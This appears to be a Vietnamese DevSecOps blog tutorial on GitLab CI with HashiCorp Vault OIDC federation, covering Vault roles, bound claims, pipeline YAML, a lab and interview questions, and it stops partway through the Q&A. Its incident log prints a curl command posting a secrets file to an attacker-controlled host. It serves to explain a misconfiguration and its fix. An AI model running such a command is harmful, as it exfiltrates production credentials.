---
layout: post
title: "[Bài 30] Quản Lý Bí Mật Với HashiCorp Vault & OIDC Federation Trong GitLab CI"
date: 2026-09-12 06:55:00 +0700
categories: [GitLab]
tags:
  - GitLab
  - CICD
  - DevSecOps
  - Vault
  - OIDC
  - Secrets
  - Keyless
  - Part-30
series: "GitLab CI/CD & DevSecOps Platform Mastery"
series_order: 30
difficulty: Advanced
thumbnail: "https://images.unsplash.com/photo-1558494949-ef010cbdcc31?auto=format&fit=crop&w=1200&q=80"
summary: "[GitLab CI/CD P.30] Quản trị bí mật không khóa chuẩn Enterprise: Tích hợp OpenID Connect (OIDC) Federation giữa GitLab CI và HashiCorp Vault, loại bỏ hoàn toàn mật khẩu tĩnh dài hạn và tự động sinh Dynamic Secrets ngắn hạn."
tldr:
  - "Xóa bỏ rủi ro bảo mật của Static CI/CD Variables và làm chủ kiến trúc Keyless OIDC Authentication."
  - "Cấu hình Vault JWT/OIDC Auth Engine với các quy tắc ràng buộc chặt chẽ (Bound Claims: sub, project_id, ref)."
  - "Sử dụng cú pháp secrets: native trong GitLab CI để tự động nạp bí mật từ Vault KV Store vào Job."
  - "Tự động cấp phát Dynamic Database Credentials có thời hạn ngắn (TTL 15 phút) tự hủy sau khi build."
  - "Tự kiểm tra kiến thức chuyên sâu với bộ 12 câu hỏi phỏng vấn phân tích tình huống thực tế."
---
{% raw %}
# [BÀI 30] QUẢN LÝ BÍ MẬT VỚI HASHICORP VAULT & OIDC FEDERATION TRONG GITLAB CI

Trong kỷ nguyên **DevOps, DevSecOps và Cloud Native Engineering**, **GitLab CI/CD** được công nhận là một trong những nền tảng tự động hóa tích hợp liên tục và phân phối liên tục (CI/CD) hoàn chỉnh, mạnh mẽ và được tin dùng nhất trong các doanh nghiệp quy mô lớn. Không chỉ dừng lại ở các pipeline tuần tự cơ bản, việc vận hành GitLab CI/CD ở cấp độ Production đòi hỏi kỹ sư phải làm chủ kiến trúc điều phối phi tuyến tính **DAG (Directed Acyclic Graph)**, cơ chế quản trị **Autoscaling Runners**, tối ưu hóa **Caching đa tầng**, xác thực không khóa **Keyless OIDC**, bảo mật chuỗi cung ứng phần mềm **SLSA & SBOM** cùng các chính sách **Quality & Security Gates** tự động.

Bài viết chuyên sâu này sẽ đồng hành cùng bạn mổ xẻ toàn diện bức tranh kiến trúc, phân tích các đánh đổi kỹ thuật thực chiến (Engineering Trade-offs), cung cấp hướng dẫn thực hành Lab chi tiết từng bước và bộ câu hỏi phỏng vấn chuyên sâu chuẩn DevOps Lead / DevSecOps Architect.

---

## 1. Bản Chất Kiến Trúc & Cơ Chế Vận Hành Tầng Thấp

### 1.1. Luận Đề Trung Tâm: Sự Nguy Hiểm Của Bí Mật Tĩnh & Cuộc Cách Mạng Không Khóa (Keyless OIDC)

Trong suốt nhiều năm, cách tiếp cận phổ biến để cung cấp thông tin đăng nhập cho CI/CD Runner là lưu trữ các **Khóa tĩnh dài hạn (Long-lived Static Secrets)** như AWS Access Keys, SSH Private Keys, Database Passwords trực tiếp vào phần cài đặt biến của GitLab (`Settings -> CI/CD -> Variables`).

Cách làm này tiềm ẩn 4 tử huyệt an ninh nghiêm trọng:
1. **Rò rỉ qua Console Logs & Debug**: Lập trình viên có thể vô tình hoặc cố ý in giá trị biến ra log (`echo $DB_PASSWORD` hoặc qua các công cụ tấn công nội bộ).
2. **Không có cơ chế tự động xoay vòng khóa (No Secret Rotation)**: Các Access Key tồn tại hàng năm mà không đổi, nếu một cựu nhân viên rời công ty nhưng vẫn giữ key thì hệ thống đứng trước nguy cơ bị xâm nhập bất cứ lúc nào.
3. **Mất dấu vết kiểm toán (Lack of Audit Trail)**: Không thể phân biệt được câu lệnh truy vấn database lúc 03:00 sáng là do Runner của pipeline nào gọi hay do kẻ tấn công sử dụng key bị rò rỉ.
4. **Vi phạm nguyên tắc phân quyền tối thiểu (Least Privilege)**: Một biến CI được dùng chung cho tất cả các nhánh và môi trường.

> **Chuẩn mực an ninh cấp ngân hàng và doanh nghiệp hiện đại bắt buộc phải chuyển sang mô hình "Keyless OIDC Authentication" kết hợp với "Dynamic Secrets": GitLab CI không lưu trữ bất kỳ mật khẩu nào; thay vào đó, mỗi Job CI sẽ được cấp một JSON Web Token (JWT) có chữ ký mật mã, dùng để đổi lấy Token ngắn hạn (Short-lived Dynamic Token) từ HashiCorp Vault chỉ có hiệu lực trong vài phút.**

```text
       QUY TRÌNH XÁC THỰC KHÔNG KHÓA OIDC GIỮA GITLAB CI VÀ HASHICORP VAULT

  [ GitLab CI Runner ] ── 1. Sinh JWT Token (id_tokens) ──► [ GitLab OIDC Identity Provider ]
          │                                                               │
          │ ◄────────── 2. Trả về JWT Token có chữ ký SHA256 ─────────────┘
          │
          ├── 3. Gửi JWT Token tới Vault API: /v1/auth/jwt/login
          │
          ▼
  [ HashiCorp Vault ] ── 4. Xác thực chữ ký JWT với GitLab Public Keys (.well-known/jwks.json)
          │           ── 5. Kiểm tra Bound Claims: project_id == 100, ref == "main"
          │
          ▼
  [ Vault Server ] ── 6. Cấp phát Dynamic Token tạm thời (TTL: 15 phút)
          │
          ▼
  [ Runner Job ]   ── 7. Sử dụng Secret thực thi tác vụ ──► [ Tự động thu hồi sau 15p ]
```

```mermaid
graph TD
    subgraph GITLAB_OIDC["1. Danh Tính Mật Mã (GitLab CI/CD OIDC)"]
        JOB["GitLab Job Runner"] --> ID_TOKENS["Cấu hình: id_tokens: VAULT_JWT"]
        ID_TOKENS --> GL_ISSUER["GitLab Token Issuer (https://gitlab.corp)"]
        GL_ISSUER --> JWT["JWT Token (Claims: sub, project, ref, user)"]
    end

    subgraph VAULT_FEDERATION["2. Xác Thực Liên Bang (HashiCorp Vault)"]
        JWT --> VAULT_LOGIN["Vault JWT Auth Endpoint (/v1/auth/jwt/login)"]
        VAULT_LOGIN --> JWKS["Verify Signature via JWKS URL"]
        JWKS --> CLAIMS{"Khớp Bound Claims?<br/>(project_id==12, ref=='main')"}
        CLAIMS -->|"Không khớp"| REJECT["Từ chối truy cập (403 Forbidden)"]
        CLAIMS -->|"Khớp"| ISSUE_TOKEN["Cấp phát Vault Client Token (TTL: 10m)"]
    end

    subgraph DYNAMIC_SECRETS["3. Cấp Phát Bí Mật Động"]
        ISSUE_TOKEN --> VAULT_KV["Đọc Secret KV Store"]
        ISSUE_TOKEN --> VAULT_DB["Vault Database Engine: Sinh User DB ngẫu nhiên"]
        VAULT_DB --> RUN_APP["Job CI kết nối Database an toàn"]
    end
```

### 1.2. Cấu Trúc JWT Token Của GitLab & Các Bound Claims Quan Trọng

Khi một Job GitLab CI chạy có cấu hình `id_tokens`, GitLab sẽ tạo một JWT chứa các Claims chuẩn:
- `iss`: Địa chỉ GitLab Server (ví dụ: `https://gitlab.corp.internal`).
- `sub`: Định danh ngữ cảnh thực thi: `project_path:group/my-app:ref_type:branch:ref:main`.
- `project_id`: ID duy nhất của dự án.
- `user_login`: Tên người dùng kích hoạt pipeline.
- `ref_protected`: Giá trị `true` nếu pipeline đang chạy trên Protected Branch/Tag.
- **Vai trò của Bound Claims trong Vault**: Vault sử dụng các thông số này để chỉ cấp quyền truy cập mật khẩu Production cho các commit chạy trên nhánh `main` được bảo vệ, ngăn chặn tuyệt đối các nhánh tính năng `feature/*` đọc trộm secrets nhạy cảm.

### 1.3. Cú Pháp `secrets:` Native Trong GitLab CI

GitLab CI hỗ trợ cú pháp `secrets:` tích hợp trực tiếp ở tầng Runner. Bạn không cần phải cài đặt Vault CLI hay viết các lệnh `curl` thủ công. Runner sẽ tự động dùng OIDC JWT để lấy secret và truyền trực tiếp vào biến môi trường hoặc tệp file trong RAM của Job.

---

## 2. Bảng So Sánh Kỹ Thuật Toàn Diện (Engineering Matrix)

| Tiêu Chí Kỹ Thuật | Static GitLab Variables | GitLab Protected/Masked Variables | HashiCorp Vault + Token Tĩnh | Vault + Keyless OIDC Federation |
| :--- | :--- | :--- | :--- | :--- |
| **Bản Chất Bí Mật** | Mật khẩu tĩnh vĩnh viễn | Mật khẩu tĩnh (Ẩn trên log) | Mật khẩu tĩnh của Vault | **Token động tạm thời (Short-lived)** |
| **Thời Gian Tồn Tại (TTL)** | Vô hạn | Vô hạn | Vài tháng (Token dài hạn) | **10 - 15 phút (Tự hủy)** |
| **Xoay Vòng Khóa (Rotation)** | Thủ công | Thủ công | Bán tự động | **Hoàn toàn tự động 100%** |
| **Bảo Vệ Theo Nhánh (Ref)** | Kém (Mọi job đều đọc được) | Chỉ chạy trên Protected Branch | Không phân biệt nhánh | **Khóa chặt theo JWT Claim (`sub`/`ref`)** |
| **Audit Logs Chi Tiết** | Không có audit trail | Ghi nhận lần cập nhật biến | Audit theo Vault Token chung | **Audit chi tiết từng Pipeline ID / Job ID** |
| **Khả Năng Sinh Dynamic DB** | Không thể | Không thể | Có thể | **Hoàn hảo (Database Engine / AWS STS)** |
| **Mức Độ An Toàn (Security)** | **Kém nhất (High Risk)** | Trung bình | Khá | **Tiêu chuẩn cao nhất (Zero-Trust)** |

---

## 3. Kiến Trúc Triển Khai Chuẩn Production (Architecture Breakdown)

### 3.1. Cấu Hình Role Trên HashiCorp Vault Qua CLI

```bash
# 1. Bật JWT Auth Engine trên Vault
vault auth enable jwt

# 2. Cấu hình OIDC Discovery trỏ tới GitLab
vault write auth/jwt/config \
    oidc_discovery_url="https://gitlab.corp.internal" \
    bound_issuer="https://gitlab.corp.internal"

# 3. Tạo Policy cho phép đọc Secret Production
vault policy write production-app-policy - <<EOF
path "secret/data/production/database" {
  capabilities = ["read"]
}
EOF

# 4. Tạo Vault Role liên kết với Project GitLab và Nhánh main
vault write auth/jwt/role/gitlab-production-role \
    role_type="jwt" \
    policies="production-app-policy" \
    token_ttl="15m" \
    token_max_ttl="30m" \
    bound_claims_type="glob" \
    bound_claims='{
      "project_id": "42",
      "ref": "main",
      "ref_protected": "true"
    }' \
    user_claim="user_login"
```

### 3.2. Cấu Hình Pipeline `.gitlab-ci.yml` Sử Dụng Native `secrets:`

```yaml
stages:
  - test
  - deploy

variables:
  VAULT_SERVER_URL: "https://vault.corp.internal:8200"
  VAULT_AUTH_ROLE: "gitlab-production-role"

deploy_to_production:
  stage: deploy
  image: alpine:3.19
  id_tokens:
    # GitLab tự động sinh JWT Token với Audience chỉ định
    VAULT_JWT:
      aud: "https://vault.corp.internal"
  secrets:
    # Tự động kết nối Vault qua OIDC và nạp Database Password vào biến DB_PASSWORD
    DB_PASSWORD:
      vault: secret/data/production/database/password@production
      file: false
    DB_CONFIG_JSON:
      vault: secret/data/production/database/config@production
      file: true
  rules:
    - if: '$CI_COMMIT_BRANCH == "main"'
  script:
    - echo "Deploying application to production using short-lived dynamic secret..."
    - echo "Database connection configured successfully."
    # Biến DB_CONFIG_JSON chứa đường dẫn tới tệp tạm thời trong RAM
    - test -f "$DB_CONFIG_JSON"
```

---

## 4. Phân Tích Cạm Bẫy Thực Chiến (5-Whys Incident Analysis)

### Tình Huống Sự Cố Thực Tế:
<span class="badge badge--rose">🕒 03:30 PM</span> Một kỹ sư thực tập tạo nhánh `feature/update-readme` và thêm lệnh `curl` trong `.gitlab-ci.yml` để gửi toàn bộ biến môi trường của Job về máy chủ cá nhân. Do cấu hình Vault Role không ràng buộc nhánh (`bound_claims` lỏng lẻo), job trên nhánh feature đã lấy thành công JWT Token, đăng nhập vào Vault và đánh cắp toàn bộ Secret của Production Database.

### Hậu Quả & Log Lỗi Thực Tế:
Dữ liệu Production Database bị trích xuất trái phép ra máy chủ bên ngoài thông qua pipeline CI của nhánh tính năng:

```text
[gitlab-runner] › ⚡  Executing job 'test_docs' on branch 'feature/update-readme'
[gitlab-runner] › ℹ  Requesting Vault JWT Token with Audience 'https://vault.corp.internal'
[vault-audit]   › ⚡  AUTH SUCCESS: Role 'app-read-role' issued token for sub: project_path:corp/backend:ref:feature/update-readme
[test-job]      › ℹ  Reading secret 'secret/data/production/database'
[test-job]      › ⚡  curl -X POST -d @secret.json https://attacker-controlled-server.com/exfiltrate
[security-team] › ❌  CRITICAL DATA EXFILTRATION DETECTED: Production DB Master Password leaked via Feature Branch CI!
```

### 5-Whys Root Cause Analysis:
1. <span class="badge badge--primary">Why 1</span> Tại sao Secret Production Database bị đánh cắp từ một nhánh feature vô hại?  
   &rarr; Do Job CI trên nhánh feature đã đổi thành công Token JWT lấy quyền truy cập bí mật Production của Vault.
2. <span class="badge badge--primary">Why 2</span> Tại sao Vault lại chấp thuận cấp quyền Production cho một nhánh feature chưa kiểm duyệt?  
   &rarr; Do cấu hình Vault Role chỉ kiểm tra `project_id` mà bỏ qua điều kiện ràng buộc nhánh `ref`.
3. <span class="badge badge--primary">Why 3</span> Tại sao cấu hình Vault Role lại bỏ qua Claim `ref`?  
   &rarr; Do kỹ sư thiết lập muốn dùng chung một Role duy nhất cho toàn bộ các nhánh trong dự án để tiện cấu hình.
4. <span class="badge badge--primary">Why 4</span> Tại sao không có sự tách biệt Role rõ ràng giữa Development, Staging và Production?  
   &rarr; Do thiếu chính sách kiểm soát truy cập phân tầng (Role & Environment Separation Policy).
5. <span class="badge badge--emerald">Root Cause Remedy</span> Cấu hình Vault Role thiếu điều kiện ràng buộc bắt buộc `"ref": "main"` và `"ref_protected": "true"` trong `bound_claims`, cho phép bất kỳ nhánh không an toàn nào cũng có thể giả mạo danh tính để đọc mật khẩu môi trường Production.

### Giải Pháp Khắc Phục Triệt Để:

1. **Ràng buộc chặt chẽ Claims trong mọi Vault Role**:
   - Role Production: Bắt buộc `bound_claims: { "ref": "main", "ref_protected": "true" }`.
   - Role Staging: Bắt buộc `bound_claims: { "ref": "staging" }`.
   - Role Development: Chỉ được cấp quyền đọc Secret môi trường Sandbox.
2. **Khai báo Audience (`aud`) tường minh**: Không dùng Audience mặc định, luôn chỉ định Audience riêng của Vault server để chống việc token bị dùng lại trên các dịch vụ khác (Replay Attack).

---

## 5. Hands-on Lab: Thiết Lập OIDC Federation Với HashiCorp Vault (8 Bước Chuẩn)

### 5.1. Mục Tiêu Lab
- Cài đặt Vault Server ở chế độ cục bộ mô phỏng (Vault Dev Mode).
- Bật JWT Auth Engine và cấu hình liên minh danh tính với GitLab OIDC.
- Thiết lập Policy và Secret Key-Value (KV v2).
- Viết Pipeline GitLab CI xác thực bằng JWT `id_tokens` và lấy Secret thành công.

```text
       QUY TRÌNH THỰC HÀNH LAB OIDC FEDERATION VỚI HASHICORP VAULT

     [ GitLab CI Job ]
            │
            ├──► 1. Khởi tạo id_tokens: VAULT_JWT_TOKEN (aud: https://vault.local)
            │
            ├──► 2. Gửi POST /v1/auth/jwt/login kèm JWT
            │
            ▼
     [ HashiCorp Vault Server ]
            │
            ├──► 3. Xác thực chữ ký JWT với GitLab JWKS
            │
            ├──► 4. Kiểm tra Project ID & Branch == "main"
            │
            ├──► 5. Cấp phát Vault Token tạm thời (TTL 10m)
            │
            ▼
     [ GitLab CI Job ] ──► 6. Tải Secret kv/data/app/config ──► Hoàn tất an toàn
```

### 5.2. Các Bước Thực Hiện Chi Tiết

#### Bước 1: Khởi Chạy HashiCorp Vault Ở Chế Độ Cục Bộ
```bash
# Chạy Vault Dev Server
vault server -dev -dev-root-token-id="root-token-lab" -dev-listen-address="0.0.0.0:8200"
```

#### Bước 2: Thiết Lập Biến Môi Trường Vault
```bash
export VAULT_ADDR='http://127.0.0.1:8200'
export VAULT_TOKEN='root-token-lab'
```

#### Bước 3: Bật JWT Auth Engine & Cấu Hình GitLab OIDC
```bash
vault auth enable jwt

# Cấu hình Issuer URL của GitLab
vault write auth/jwt/config \
    oidc_discovery_url="https://gitlab.corp.internal" \
    bound_issuer="https://gitlab.corp.internal"
```

#### Bước 4: Tạo Secret Mẫu Trong Vault KV Engine v2
```bash
# Tạo Secret chứa Database URL và API Key
vault kv put secret/production/payment-service \
    DB_CONNECTION_STRING="postgresql://app_user:SuperSecurePass99@db.internal:5432/payment_db" \
    STRIPE_SECRET_KEY="sk_live_998877665544332211"
```

#### Bước 5: Tạo Vault Policy Cho Phép Đọc Quyền Tối Thiểu
Tạo tệp `payment-policy.hcl`:
```hcl
path "secret/data/production/payment-service" {
  capabilities = ["read"]
}
```
Nạp policy vào Vault:
```bash
vault policy write payment-production-policy payment-policy.hcl
```

#### Bước 6: Định Nghĩa Vault JWT Role Với Bound Claims An Toàn
```bash
vault write auth/jwt/role/payment-prod-role \
    role_type="jwt" \
    policies="payment-production-policy" \
    token_ttl="10m" \
    bound_claims_type="glob" \
    bound_claims='{
      "project_path": "fintech/payment-service",
      "ref": "main"
    }' \
    user_claim="user_login"
```

#### Bước 7: Cấu Hình Tệp `.gitlab-ci.yml` Lấy Secret Tự Động
```yaml
stages:
  - fetch_secrets

retrieve_vault_secrets:
  stage: fetch_secrets
  image: vault:1.15.4
  id_tokens:
    VAULT_AUTH_JWT:
      aud: "https://vault.corp.internal"
  variables:
    VAULT_ADDR: "http://vault.corp.internal:8200"
    VAULT_ROLE: "payment-prod-role"
  script:
    - apk add --no-cache jq
    # 1. Đăng nhập Vault bằng JWT Token
    - >-
      export VAULT_TOKEN=$(vault write -field=token auth/jwt/login
      role="${VAULT_ROLE}"
      jwt="${VAULT_AUTH_JWT}")
    # 2. Đọc Secret từ Vault KV Store
    - >-
      vault kv get -format=json secret/production/payment-service > secret.json
    - export DB_CONN=$(jq -r .data.data.DB_CONNECTION_STRING secret.json)
    - echo "Retrieved Secret successfully! Token will auto-expire in 10 minutes."
    # 3. Xóa file secret.json khỏi workspace
    - rm -f secret.json
  rules:
    - if: '$CI_COMMIT_BRANCH == "main"'
```

#### Bước 8: Commit Code Và Quan Sát Quá Trình Xác Thực Thành Công
- Đẩy commit lên branch `main`.
- Xem log job `retrieve_vault_secrets`:
  ```text
  $ export VAULT_TOKEN=$(vault write -field=token auth/jwt/login role="payment-prod-role" jwt="${VAULT_AUTH_JWT}")
  $ vault kv get -format=json secret/production/payment-service > secret.json
  Retrieved Secret successfully! Token will auto-expire in 10 minutes.
  ```

> [!NOTE]
> **Check-point Lab 30**: Job xác thực OIDC thành công 100%, không lưu mật khẩu cứng trong GitLab CI variables và Vault token tự động hết hạn sau 10 phút.

---

## 6. Bộ Câu Hỏi Vấn Đáp & Phỏng Vấn Chuyên Sâu (Self-Check Q&A)

<details class="qa-card">
  <summary class="qa-summary">
    <span class="qa-num-badge">Q01</span>
    <span>Tại sao xác thực OIDC Federation lại an toàn hơn đáng kể so với việc lưu Token cố định trong GitLab Variables?</span>
  </summary>
  <div class="qa-body">
    <div class="qa-answer">
      <div class="qa-answer-header">
        <svg class="qa-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
        <span>Phân Tích &amp; Lời Giải Kỹ Thuật</span>
      </div>
      <p><strong>Ưu điểm bảo mật:</strong></p>
      <ul>
        <li><strong>Không tồn tại bí mật tĩnh (No Static Credentials)</strong>: Không có mật khẩu hay token nào được lưu trong cơ sở dữ liệu của GitLab. Do đó, nếu kẻ xấu dump database GitLab cũng không lấy được thông tin đăng nhập.</li>
        <li><strong>Thời hạn ngắn (Short-lived)</strong>: Token được sinh ra lúc job bắt đầu và tự hủy sau khi job xong (hoặc tối đa 15 phút).</li>
        <li><strong>Ràng buộc ngữ cảnh (Contextual Authorization)</strong>: Token chỉ hợp lệ khi chạy đúng project ID, đúng commit branch và đúng người kích hoạt.</li>
      </ul>
    </div>
  </div>
</details>

<details class="qa-card">
  <summary class="qa-summary">
    <span class="qa-num-badge">Q02</span>
    <span>Trường `aud` (Audience) trong cấu hình `id_tokens` của GitLab CI có vai trò gì?</span>
  </summary>
  <div class="qa-body">
    <div class="qa-answer">
      <div class="qa-answer-header">
        <svg class="qa-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
        <span>Phân Tích &amp; Lời Giải Kỹ Thuật</span>
      </div>
      <p><strong>Mục đích:</strong></p>
      <p><code>aud</code> chỉ định đối tượng người nhận dự kiến của JWT (thường là URL của Vault hoặc AWS STS). Khi Vault nhận được token, nó sẽ kiểm tra xem giá trị <code>aud</code> trong token có khớp với cấu hình của nó hay không. Điều này ngăn chặn cuộc tấn công <strong>Token Substitution (Replay Attack)</strong> — ngăn kẻ tấn công lấy JWT được cấp cho dịch vụ A đem đi đăng nhập vào dịch vụ B.</p>
    </div>
  </div>
</details>

<details class="qa-card">
  <summary class="qa-summary">
    <span class="qa-num-badge">Q03</span>
    <span>Cơ chế "Dynamic Database Secrets" trong HashiCorp Vault hoạt động như thế nào?</span>
  </summary>
  <div class="qa-body">
    <div class="qa-answer">
      <div class="qa-answer-header">
        <svg class="qa-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
        <span>Phân Tích &amp; Lời Giải Kỹ Thuật</span>
      </div>
      <p><strong>Nguyên lý:</strong></p>
      <p>Thay vì đọc một tài khoản Database cố định, Vault Database Secrets Engine sẽ <strong>tạo mới một User và Password ngẫu nhiên trực tiếp trong Database</strong> (ví dụ: <code>v-token-job-12345</code>) khi có yêu cầu từ CI. User này chỉ có quyền đúng trong phạm vi cần thiết và có thời hạn sống (Lease TTL, ví dụ: 15 phút). Hết thời gian này, Vault sẽ tự động phát lệnh <code>DROP USER</code> trên database.</p>
    </div>
  </div>
</details>

<details class="qa-card">
  <summary class="qa-summary">
    <span class="qa-num-badge">Q04</span>
    <span>Làm thế nào để truyền Secret từ Vault vào ứng dụng mà không bao giờ ghi ra tệp tin trên ổ cứng runner?</span>
  </summary>
  <div class="qa-body">
    <div class="qa-answer">
      <div class="qa-answer-header">
        <svg class="qa-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
        <span>Phân Tích &amp; Lời Giải Kỹ Thuật</span>
      </div>
      <p><strong>Giải pháp:</strong></p>
      <ul>
        <li>Sử dụng tính năng <code>secrets: file: false</code> trong GitLab CI để nạp thẳng secret vào biến môi trường trong bộ nhớ RAM.</li>
        <li>Sử dụng công cụ <strong>Vault Agent / Envconsul</strong> để khởi chạy ứng dụng trực tiếp kèm biến môi trường: <code>envconsul -pristine -prefix secret/data/app ./server</code> mà không tạo file trung gian.</li>
      </ul>
    </div>
  </div>
</details>

<details class="qa-card">
  <summary class="qa-summary">
    <span class="qa-num-badge">Q05</span>
    <span>Sự khác biệt giữa HashiCorp Vault KV Engine phiên bản 1 (v1) và phiên bản 2 (v2) là gì?</span>
  </summary>
  <div class="qa-body">
    <div class="qa-answer">
      <div class="qa-answer-header">
        <svg class="qa-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
        <span>Phân Tích &amp; Lời Giải Kỹ Thuật</span>
      </div>
      <p><strong>So sánh:</strong></p>
      <ul>
        <li><strong>KV v1</strong>: Chỉ lưu trữ giá trị hiện tại đơn giản. Không có lịch sử phiên bản, thao tác xóa sẽ làm mất vĩnh viễn dữ liệu.</li>
        <li><strong>KV v2</strong>: Hỗ trợ đánh số phiên bản tự động (Versioning), cho phép xem lại các bản secret cũ (Rollback), hỗ trợ phục hồi dữ liệu sau khi xóa mềm (Soft Delete) và có cấu trúc đường dẫn API chứa tiền tố <code>/data/</code> (ví dụ: <code>secret/data/...</code>).</li>
      </ul>
    </div>
  </div>
</details>

<details class="qa-card">
  <summary class="qa-summary">
    <span class="qa-num-badge">Q06</span>
    <span>Làm sao để cấu hình Vault AppRole thay vì OIDC khi chạy các tác vụ hạ tầng ngoài GitLab?</span>
  </summary>
  <div class="qa-body">
    <div class="qa-answer">
      <div class="qa-answer-header">
        <svg class="qa-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
        <span>Phân Tích &amp; Lời Giải Kỹ Thuật</span>
      </div>
      <p><strong>Phương thức AppRole:</strong></p>
      <p>Vault AppRole sử dụng cặp thông tin <code>RoleID</code> (tương đương Username) và <code>SecretID</code> (tương đương Password có thời hạn). Thường dùng cho các ứng dụng chạy trên VM cố định hoặc máy chủ Bare-metal không có OIDC Identity Provider.</p>
    </div>
  </div>
</details>

<details class="qa-card">
  <summary class="qa-summary">
    <span class="qa-num-badge">Q07</span>
    <span>Tại sao cần bật cờ `ref_protected: "true"` trong Bound Claims của Vault cho môi trường Production?</span>
  </summary>
  <div class="qa-body">
    <div class="qa-answer">
      <div class="qa-answer-header">
        <svg class="qa-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
        <span>Phân Tích &amp; Lời Giải Kỹ Thuật</span>
      </div>
      <p><strong>Bảo vệ an ninh:</strong></p>
      <p>Bất kỳ lập trình viên nào có quyền tạo branch cũng có thể đặt tên nhánh là <code>main-patch</code> hoặc <code>release</code>. Cờ <code>ref_protected: "true"</code> do GitLab cấp trong JWT đảm bảo rằng commit đó đang thực sự chạy trên một nhánh được áp dụng chính sách <strong>Protected Branch</strong> (chỉ Maintainer mới có quyền merge sau khi qua Code Review), ngăn chặn việc developer tự tạo branch rác để lấy trộm secret.</p>
    </div>
  </div>
</details>

<details class="qa-card">
  <summary class="qa-summary">
    <span class="qa-num-badge">Q08</span>
    <span>Làm thế nào để xoay vòng khóa Root CA hoặc Token Signing Key của GitLab OIDC mà không làm sập CI?</span>
  </summary>
  <div class="qa-body">
    <div class="qa-answer">
      <div class="qa-answer-header">
        <svg class="qa-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
        <span>Phân Tích &amp; Lời Giải Kỹ Thuật</span>
      </div>
      <p><strong>Cơ chế JWKS:</strong></p>
      <p>GitLab cung cấp endpoint <strong>JSON Web Key Set (JWKS)</strong> tại đường dẫn <code>https://gitlab.corp.internal/oauth/discovery/keys</code>. Khi GitLab xoay vòng khóa ký JWT, Vault sẽ tự động tải các Public Keys mới từ endpoint này để xác thực chữ ký mà không cần khởi động lại server hay cập nhật cấu hình thủ công.</p>
    </div>
  </div>
</details>

<details class="qa-card">
  <summary class="qa-summary">
    <span class="qa-num-badge">Q09</span>
    <span>Sự cố: Job CI báo lỗi `permission denied` khi gọi Vault API dù JWT Token hợp lệ. Tìm nguyên nhân thế nào?</span>
  </summary>
  <div class="qa-body">
    <div class="qa-answer">
      <div class="qa-answer-header">
        <svg class="qa-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
        <span>Phân Tích &amp; Lời Giải Kỹ Thuật</span>
      </div>
      <p><strong>Các bước kiểm tra:</strong></p>
      <ol>
        <li>Kiểm tra Vault Policy gắn với Role xem đã cấp đúng quyền <code>capabilities = ["read"]</code> cho đường dẫn chính xác (đặc biệt lưu ý tiền tố <code>/data/</code> nếu dùng KV v2).</li>
        <li>Kiểm tra Vault Audit Log (<code>/var/log/vault/audit.log</code>) để xem chính xác mã lỗi và Claim nào bị từ chối.</li>
      </ol>
    </div>
  </div>
</details>

<details class="qa-card">
  <summary class="qa-summary">
    <span class="qa-num-badge">Q10</span>
    <span>Làm thế nào để tích hợp HashiCorp Vault với AWS để sinh IAM STS Credentials động cho Runner?</span>
  </summary>
  <div class="qa-body">
    <div class="qa-answer">
      <div class="qa-answer-header">
        <svg class="qa-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
        <span>Phân Tích &amp; Lời Giải Kỹ Thuật</span>
      </div>
      <p><strong>Cơ chế Vault AWS Secrets Engine:</strong></p>
      <p>Kích hoạt <code>vault secrets enable aws</code>. Cấu hình Vault liên kết với một IAM Role trong AWS. Khi GitLab CI yêu cầu, Vault sẽ gọi <code>sts:AssumeRole</code> để sinh ra cặp <code>AWS_ACCESS_KEY_ID</code>, <code>AWS_SECRET_ACCESS_KEY</code> và <code>AWS_SESSION_TOKEN</code> tạm thời có hiệu lực 15 phút cho Runner thực hiện deploy Terraform/S3.</p>
    </div>
  </div>
</details>

<details class="qa-card">
  <summary class="qa-summary">
    <span class="qa-num-badge">Q11</span>
    <span>Làm sao để ngăn chặn việc Secret bị ghi vào tệp Artifacts hoặc Cache của GitLab CI?</span>
  </summary>
  <div class="qa-body">
    <div class="qa-answer">
      <div class="qa-answer-header">
        <svg class="qa-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
        <span>Phân Tích &amp; Lời Giải Kỹ Thuật</span>
      </div>
      <p><strong>Quy tắc an toàn:</strong></p>
      <ul>
        <li>Không lưu trữ file secret trong thư mục làm việc của dự án nếu thư mục đó nằm trong danh sách <code>artifacts:paths</code> hoặc <code>cache:paths</code>.</li>
        <li>Luôn chạy lệnh <code>rm -f secret.json</code> ở khối <code>after_script</code> hoặc sử dụng RAM disk (<code>/dev/shm</code>) để chứa tệp bí mật tạm thời.</li>
      </ul>
    </div>
  </div>
</details>

<details class="qa-card">
  <summary class="qa-summary">
    <span class="qa-num-badge">Q12</span>
